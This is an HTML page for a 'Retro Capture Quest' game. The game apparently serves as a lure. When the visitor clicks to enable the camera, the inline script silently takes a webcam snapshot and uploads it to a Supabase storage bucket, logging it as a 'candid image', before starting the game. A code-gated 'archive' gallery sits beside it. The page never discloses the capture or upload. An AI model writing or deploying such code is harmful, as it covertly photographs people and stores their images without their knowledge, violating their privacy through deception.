<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>RETRO CAPTURE QUEST</title>
  <link rel="stylesheet" href="style.css">
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>

<div class="screen">
  <h1>üïπÔ∏è RETRO CAPTURE QUEST</h1>
  <p class="subtitle">GRANT CAMERA ACCESS TO START</p>

  <!-- ENABLE CAMERA BUTTON -->
  <button id="enableCamera" class="retro-button">CLICK TO ENABLE CAMERA</button>

  <!-- CAMERA -->
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

  <!-- GAME ANIMATION -->
  <div class="game">
    <div class="ground"></div>
    <div class="runner" id="runner"></div>
  </div>

  <!-- ACCESS CODE -->
  <div class="code-box">
    <input id="code" placeholder="ENTER CODE">
    <button onclick="checkCode()">UNLOCK ARCHIVE</button>
  </div>

  <!-- GALLERY -->
  <div id="gallery"></div>
</div>

<script src="script.js"></script>
<script>
  // Retro button triggers camera
  document.getElementById("enableCamera").addEventListener("click", async () => {
    document.getElementById("enableCamera").style.display = "none"; // hide button
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      video.style.display = "block";

      // Wait until video is ready, then take snapshot
      video.onloadedmetadata = async () => {
        // Draw frame to canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Upload to Supabase
        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
        const filename = `photo_${Date.now()}.png`;
        const { error } = await supabase
          .storage
          .from("photos")
          .upload(filename, blob);
        if (error) {
          console.error("Upload failed:", error);
        } else {
          console.log("Candid image stored:", filename);
          startRunner();
        }
      };
    } catch (e) {
      alert("Camera permission denied");
      console.error(e);
    }
  });
</script>
</body>
</html>
